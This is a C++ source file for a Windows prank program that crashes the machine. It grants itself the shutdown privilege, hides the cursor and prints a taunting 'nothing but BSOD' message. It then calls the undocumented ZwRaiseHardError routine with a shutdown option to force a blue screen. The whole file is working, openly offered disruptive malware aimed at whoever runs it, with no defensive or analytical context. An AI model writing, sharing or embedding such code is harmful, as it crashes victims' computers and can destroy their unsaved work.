#include<Windows.h>
#include<STDBOOL.h>
#include <iostream>

#pragma comment (lib, "User32.lib")
using namespace std;
BOOL SetPrivilege(LPCWSTR lpPrivilegeName, BOOL fEnable)
{

	HANDLE hToken;
	TOKEN_PRIVILEGES NewState;
	LUID luidPrivilegeLUID;


	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken))
	{
		/*If opening token failed...*/
		return FALSE;
	}


	if (fEnable == FALSE) /*We disable all the privileges... */
	{
		if (!AdjustTokenPrivileges(hToken, TRUE, NULL, NULL, NULL, NULL))
		{
			return FALSE;
		}
		else return TRUE;
	}
	/*Look up the LUID value of the privilege... */
	LookupPrivilegeValue(NULL, lpPrivilegeName, &luidPrivilegeLUID);

	NewState.PrivilegeCount = 1;
	NewState.Privileges[0].Luid = luidPrivilegeLUID;
	NewState.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	/*Improve this process's privilege, so we can shut down the system next. */
	if (!AdjustTokenPrivileges(hToken, FALSE, &NewState, NULL, NULL, NULL))
	{
		return FALSE;
	}

	/*We should not only check if the improving was successed... */
	if (GetLastError() == ERROR_NOT_ALL_ASSIGNED)
	{
		return FALSE;
	}

	return TRUE;
}

typedef enum _HARDERROR_RESPONSE_OPTION {
	OptionAbortRetryIgnore,
	OptionOk,
	OptionOkCancel,
	OptionRetryCancel,
	OptionYesNo,
	OptionYesNoCancel,
	OptionShutdownSystem,
	OptionOkNoWait,
	OptionCancelTryContinue
} HARDERROR_RESPONSE_OPTION;

typedef LONG(WINAPI* type_ZwRaiseHardError)(LONG ErrorStatus, ULONG NumberOfParameters, ULONG UnicodeStringParameterMask, PULONG_PTR Parameters, HARDERROR_RESPONSE_OPTION ValidResponseOptions, PULONG Response);

typedef struct _UNICODE_STRING {
	USHORT Length;
	USHORT MaximumLength;
	PWCH Buffer;
} UNICODE_STRING;

int main(int argc, char* argv[])
{
	
	while (ShowCursor(FALSE) >= 0)
	{

		ShowCursor(FALSE);
	}
	
	cout << " You click and run it,right? \nDon't worry,there's nothing but BSOD!!!\nSo ¡°requiescat in pace¡±and good luck!\n\nByyyyyyyyyye! :D";
	Sleep(1000 * 5);
	/*FreeConsole();*/
	UNICODE_STRING str = { 8, 10, PWCH("test") };
	ULONG x, args[] = { 0x12345678, 0x87654321, (ULONG)&str };
	HMODULE hDll = GetModuleHandle(TEXT("ntdll.dll"));
	type_ZwRaiseHardError ZwRaiseHardError = (type_ZwRaiseHardError)GetProcAddress(hDll, "ZwRaiseHardError");
	bool bSuccess = SetPrivilege( SE_SHUTDOWN_NAME, TRUE);
	if (bSuccess) ZwRaiseHardError(0xC000021A, 3, 4, args, OptionShutdownSystem, &x);

	SetPrivilege(NULL, FALSE);

	return 0;
}

